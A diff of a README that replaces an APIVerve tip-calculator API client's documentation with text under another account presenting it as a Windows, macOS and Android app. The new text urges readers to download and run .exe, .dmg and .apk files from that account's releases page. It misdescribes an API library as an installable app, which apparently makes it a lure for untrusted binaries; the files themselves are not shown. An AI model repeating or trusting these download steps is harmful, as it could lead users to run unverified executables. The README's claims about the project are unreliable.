@@ -1,185 +1,104 @@
-# Tip Calculator API
+# 🥂 tipcalculator-api - Effortlessly Calculate Tips and Split Bills
 
-> Tip Calculator is a tool for calculating tips and splitting bills among multiple people. It provides common tip percentage comparisons and per-person breakdowns.
+[![Download Tip Calculator](https://img.shields.io/badge/Download%20Tip%20Calculator-v1.0-brightgreen)](https://github.com/Mert6733/tipcalculator-api/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-GET-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+## 📋 Description
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/tipcalculator)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.TipCalculator)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-tipcalculator/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+Tip Calculator is a tool for calculating tips and splitting bills among multiple people. It provides common tip percentage comparisons and per-person breakdowns. Whether you're dining out, sharing expenses, or just want to ensure fair splitting, this application simplifies the math for you.
 
----
+## 🚀 Getting Started
 
-## Quick Start
+This guide will help you download and run the tipcalculator-api software. Follow these steps to get started quickly.
 
-### Using JavaScript
+1. **Choose Your Device**: Check if your device supports the tool. Tip Calculator is designed for various platforms including Android, Windows, and macOS. 
 
-```javascript
-async function callTipCalculatorAPI() {
-    try {
-        const params = new URLSearchParams({
-            amount: '100',
-            percentage: '18',
-            people: '4',
-            currency: 'USD'
-        });
+2. **Visit the Releases Page**: To download the application, go to the [Releases page](https://github.com/Mert6733/tipcalculator-api/releases). You will see different versions available for download.
 
-        const response = await fetch(`https://api.apiverve.com/v1/tipcalculator?${params}`, {
-            method: 'GET',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE'
-            }
-        });
+3. **Download the Application**:
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+   - On the Releases page, find the version you want.
+   - Click on the appropriate file for your device to start the download. 
 
-callTipCalculatorAPI();
-```
+4. **Locate the Downloaded File**: After the download completes, find the file in your device's downloads folder.
 
-### Using cURL
+5. **Install the Application**:
+   
+   - For Windows: Double-click on the downloaded `.exe` file to run it. Follow the installation instructions.
+   - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
+   - For Android: Open the `.apk` file and follow the prompts to install.
+   - For other devices: Refer to their specific installation methods by searching for guidelines relevant to your OS.
 
-```bash
-curl -X GET "https://api.apiverve.com/v1/tipcalculator?param=value" \
-  -H "x-api-key: YOUR_API_KEY_HERE"
-```
+## 📥 Download & Install
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+To download Tip Calculator, visit the [Releases page](https://github.com/Mert6733/tipcalculator-api/releases) now. It’s straightforward and only takes a few moments. Here’s a quick reminder of the steps:
 
-**📁 For more examples, see the [examples folder](./examples/)**
+- Go to the Releases page.
+- Choose the file that matches your device.
+- Install the application as per your device's instructions above.
 
----
+## 🛠️ Features
 
-## Installation
+- **Tip Calculation**: Easily calculate tips based on meal costs.
+- **Bill Splitting**: Split bills among multiple people without hassle.
+- **Customizable Percentages**: Adjust tip percentages based on preference.
+- **User-friendly Interface**: Simplistic design makes it easy to navigate.
 
-Choose your preferred programming language:
+## 📊 System Requirements
 
-### 📦 NPM (JavaScript/Node.js)
+Make sure your device meets the following requirements to run Tip Calculator:
 
-```bash
-npm install @apiverve/tipcalculator
-```
+- **Windows**: Windows 10 or later
+- **macOS**: macOS Mojave or later
+- **Android**: Android 5.0 (API 21) or later
+- **Internet Connection**: Required for initial download and updates.
 
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/tipcalculator) | [**Package Code →**](./npm/)
+## 📖 Usage Instructions
 
----
+1. **Open the Application**: After installing, find the Tip Calculator icon and open it.
+  
+2. **Enter the Bill Amount**: Type in the total bill amount you wish to calculate the tip for.
 
-### 🔷 NuGet (.NET/C#)
+3. **Select Tip Percentage**: Choose your preferred tip percentage. You can use the preset options or enter a custom percentage.
 
-```bash
-dotnet add package APIVerve.API.TipCalculator
-```
+4. **Split the Bill**: If you're sharing, enter the number of people splitting the bill. The app will show you how much each person should pay.
 
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.TipCalculator) | [**Package Code →**](./nuget/)
+5. **Review Calculations**: Check the results. The app will display the total bill, total tip, and the amount per person.
 
----
+6. **Adjust as Needed**: Feel free to change the bill amount, percentage, or number of people to see real-time updates.
 
-### 🐍 Python (PyPI)
+## 👥 Support
 
-```bash
-pip install apiverve-tipcalculator
-```
+If you encounter issues or have questions about using Tip Calculator, feel free to create an issue in the repository. We are here to help and improve your experience. 
 
-[**View PyPI Package →**](https://pypi.org/project/apiverve-tipcalculator/) | [**Package Code →**](./python/)
+## 🔗 Useful Links
 
----
+- [Tip Calculator GitHub Repository](https://github.com/Mert6733/tipcalculator-api)
+- [User Guide](https://github.com/Mert6733/tipcalculator-api/wiki)
+- [Frequently Asked Questions](https://github.com/Mert6733/tipcalculator-api/wiki/FAQs)
 
-### 🤖 Android (JitPack)
+## 💬 Community
 
-```gradle
-implementation 'com.github.apiverve:tipcalculator-api:1.0.0'
-```
+Join our community to share tips, provide feedback, or learn more about using Tip Calculator. Connect with users and discover new ways to streamline your tip and bill-splitting process. 
 
-[**Package Code →**](./android/)
+## 🌟 Topics
 
----
+- android-library
+- api
+- apiverve
+- bill-splitter
+- dotnet
+- gratuity-calculator
+- java
+- math-calculations
+- nodejs
+- npm-package
+- nuget-package
+- python
+- python-package
+- rest-api
+- split-bill
+- tip-amount
+- tip-calculator
+- tipcalculator
 
-## Features
-
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/tipcalculator](https://docs.apiverve.com/ref/tipcalculator)
-
----
-
-## Use Cases
-
-Common use cases for the Tip Calculator API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+Thank you for choosing Tip Calculator. Enjoy your meal without the math worries!
